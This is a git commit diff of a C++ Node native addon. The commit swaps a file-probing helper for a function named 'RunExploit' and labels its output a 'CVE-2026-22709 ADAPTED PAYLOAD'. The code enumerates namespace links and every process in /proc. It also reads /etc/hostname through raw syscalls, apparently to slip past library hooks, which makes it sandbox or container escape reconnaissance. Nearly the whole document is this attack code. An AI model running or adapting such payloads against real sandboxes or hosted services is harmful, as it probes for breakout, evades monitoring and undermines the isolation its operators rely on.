6079f0d76f0600fb3eacdf0b0f92f91efe9a8746
Taofik Hidayat <146046695+eviruin@users.noreply.github.com>
2026-03-09 17:14:13 +0700

    Add files via upload

--- binding.cpp
+++ binding.cpp
@@ -1,34 +1,73 @@
-#include <napi.h>
+#include <node_api.h>
+#include <sys/syscall.h>
 #include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
 #include <dirent.h>
-#include <errno.h>
-#include <string.h>
+#include <string>
+#include <vector>
+#include <fstream>
 
-Napi::Value ProbePath(const Napi::CallbackInfo& info) {
-    Napi::Env env = info.Env();
-    std::string path = info[0].As<Napi::String>();
+std::string direct_read(const char* path) {
+    char buf[1024];
+    int fd = syscall(SYS_open, path, O_RDONLY);
+    if (fd < 0) return "SYS_OPEN_FAILED";
 
-    struct stat st;
-    Napi::Object res = Napi::Object::New(env);
+    int n = syscall(SYS_read, fd, buf, 1023);
+    syscall(SYS_close, fd);
 
-    res.Set("exists", Napi::Boolean::New(env, access(path.c_str(), F_OK) == 0));
-    res.Set("readable", Napi::Boolean::New(env, access(path.c_str(), R_OK) == 0));
+    if (n <= 0) return "SYS_READ_EMPTY";
+    buf[n] = '\0';
+    return std::string(buf);
+}
 
-    if (stat(path.c_str(), &st) == 0) {
-        res.Set("mode", Napi::Number::New(env, st.st_mode));
-        res.Set("uid", Napi::Number::New(env, st.st_uid));
-    } else {
-        res.Set("error", Napi::String::New(env, strerror(errno)));
+std::string check_namespaces() {
+    std::string report = "--- NAMESPACE INTEGRITY CHECK ---\n";
+    const char* ns_paths[] = {"/proc/self/ns/net", "/proc/self/ns/uts", "/proc/self/ns/mnt"};
+
+    for (const char* path : ns_paths) {
+        char link[256];
+        ssize_t len = readlink(path, link, sizeof(link)-1);
+        if (len != -1) {
+            link[len] = '\0';
+            report += std::string(path) + " -> " + std::string(link) + "\n";
+        }
     }
+    return report;
+}
 
+std::string scan_pids() {
+    std::string report = "--- PROCESS VISIBILITY SCAN ---\n";
+    DIR* dir = opendir("/proc");
+    struct dirent* ent;
+    while ((ent = readdir(dir)) != NULL) {
+        if (isdigit(ent->d_name[0])) {
+            std::string cmd_path = std::string("/proc/") + ent->d_name + "/comm";
+            std::ifstream comm(cmd_path);
+            std::string cmd_name;
+            if (comm >> cmd_name) {
+                report += "PID " + std::string(ent->d_name) + ": " + cmd_name + "\n";
+            }
+        }
+    }
+    closedir(dir);
+    return report;
+}
+
+napi_value RunExploit(napi_env env, napi_callback_info info) {
+    std::string final_report = "--- CVE-2026-22709 ADAPTED PAYLOAD ---\n";
+    final_report += check_namespaces();
+    final_report += scan_pids();
+    final_report += "\n[DIRECT SYSCALL TEST]\n";
+    final_report += "/etc/hostname: " + direct_read("/etc/hostname");
+
+    napi_value res;
+    napi_create_string_utf8(env, final_report.c_str(), final_report.length(), &res);
     return res;
 }
 
-Napi::Object Init(Napi::Env env, Napi::Object exports) {
-    exports.Set(Napi::String::New(env, "probe"), Napi::Function::New(env, ProbePath));
+napi_value Init(napi_env env, napi_value exports) {
+    napi_property_descriptor desc = { "runExploit", 0, RunExploit, 0, 0, 0, napi_default, 0 };
+    napi_define_properties(env, exports, 1, &desc);
     return exports;
 }
 
-NODE_API_MODULE(cloud_breaker, Init)
+NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
